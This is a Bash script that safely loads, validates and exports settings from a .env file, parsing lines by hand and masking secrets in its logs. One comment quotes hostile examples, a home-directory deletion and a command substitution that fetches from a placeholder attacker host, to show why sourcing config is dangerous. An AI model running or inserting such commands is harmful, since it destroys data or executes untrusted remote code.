#!/usr/bin/env bash
# Using /usr/bin/env is preferable since /bin/bash might not be available in certain environments, like containers.
# File: scripts/advanced/day9/config-loader.sh
# Purpose: Load, validate, and export configuration from a .env file — safely.
#
# Designed to be *sourced* (so the exported vars land in the caller's env, the
# way app.sh uses it) or *executed* directly for a quick self-check.
set -euo pipefail

# === Paths ===
# CONFIG_FILE is overridable so tests (and other callers) can point it at a
# throwaway file instead of the repo's real .env — the same pattern Day 8 used
# to make LOG_FILE testable.
#
# The default is resolved relative to the repo root (two levels up from this
# script), NOT the current working directory, so `source .../config-loader.sh`
# finds the .env no matter where the caller was invoked from.
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
CONFIG_FILE="${CONFIG_FILE:-$REPO_ROOT/.env}"

# === Logging ===
log() {
  local level="$1"
  shift
  echo "[$(date +'%Y-%m-%d %H:%M:%S')] [CONFIG] [$level] $*"
}

# Mask a secret for logging: show only the first and last two characters.
# Never log a raw API key, password, or private key.
mask() {
  local v="$1"
  if ((${#v} <= 4)); then
    printf '****'
  else
    printf '%s***%s' "${v:0:2}" "${v: -2}"
  fi
}

# === Load .env — WITHOUT `source` ===
# `source .env` runs the file as Bash. A single line like `rm -rf ~` or
# `API_KEY=$(curl evil.sh)` in a config file would execute with the caller's
# privileges. Parse KEY=VALUE lines by hand instead: comments and blank lines
# are skipped, anything that isn't a valid assignment is refused rather than
# run, and surrounding quotes are stripped.
load_env() {
  local file="$1" line key val
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line%$'\r'}"                        # tolerate CRLF files from Windows
    [[ "$line" =~ ^[[:space:]]*# ]] && continue # comment
    [[ "$line" =~ ^[[:space:]]*$ ]] && continue # blank
    line="${line#export }"                      # allow an optional `export `
    if [[ ! "$line" =~ ^[[:space:]]*([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
      log "WARN" "Ignoring malformed line: $line"
      continue
    fi
    key="${BASH_REMATCH[1]}"
    val="${BASH_REMATCH[2]}"
    if [[ "$val" =~ ^\"(.*)\"$ ]] || [[ "$val" =~ ^\'(.*)\'$ ]]; then
      val="${BASH_REMATCH[1]}" # strip matching surrounding quotes
    fi
    printf -v "$key" '%s' "$val"
    export "${key?}"
  done <"$file"
}

if [[ ! -f "$CONFIG_FILE" ]]; then
  log "ERROR" "Config file not found: $CONFIG_FILE"
  log "INFO" "Copy the template first:  cp .env.example .env"
  exit 1
fi

log "INFO" "Loading config from $CONFIG_FILE"
load_env "$CONFIG_FILE"

# === Required Variables ===
# Names match .env.example exactly. The old loader validated DB_HOST, which
# never existed in the template — the deployment target is TARGET_HOST.
required_vars=(
  "APP_ENV"
  "TARGET_HOST"
  "API_KEY"
)

missing=()
for var in "${required_vars[@]}"; do
  if [[ -z "${!var:-}" ]]; then
    missing+=("$var")
  fi
done

if [[ ${#missing[@]} -gt 0 ]]; then
  log "ERROR" "Missing required variables: ${missing[*]}"
  log "INFO" "Fill them in $CONFIG_FILE (see .env.example)"
  exit 1
fi

# === Validate APP_ENV against the allowed set ===
case "$APP_ENV" in
  dev | staging | prod) ;;
  *)
    log "ERROR" "APP_ENV must be one of: dev | staging | prod (got: '$APP_ENV')"
    exit 1
    ;;
esac

# === Set Defaults ===
# `: "${VAR:=default}"` assigns only when VAR is unset or empty.
: "${TARGET_PORT:=443}"
: "${DEBUG:=false}"
: "${LOG_LEVEL:=warn}"
: "${MAX_RETRIES:=5}"

# TARGET_PORT and MAX_RETRIES must be numeric — a typo shouldn't reach runtime.
if [[ ! "$TARGET_PORT" =~ ^[0-9]+$ ]]; then
  log "ERROR" "TARGET_PORT must be numeric (got: '$TARGET_PORT')"
  exit 1
fi
if [[ ! "$MAX_RETRIES" =~ ^[0-9]+$ ]]; then
  log "ERROR" "MAX_RETRIES must be numeric (got: '$MAX_RETRIES')"
  exit 1
fi

# === Make readonly, then export ===
# readonly comes first so a later accidental reassignment fails loudly.
readonly APP_ENV TARGET_HOST TARGET_PORT API_KEY DEBUG LOG_LEVEL MAX_RETRIES
export APP_ENV TARGET_HOST TARGET_PORT API_KEY DEBUG LOG_LEVEL MAX_RETRIES

log "SUCCESS" "Config loaded successfully"
# Secrets are masked; never print API_KEY / DB_PASS / SSH_KEY in the clear.
log "INFO" "Environment: $APP_ENV | Target: $TARGET_HOST:$TARGET_PORT | Debug: $DEBUG | API_KEY: $(mask "$API_KEY")"
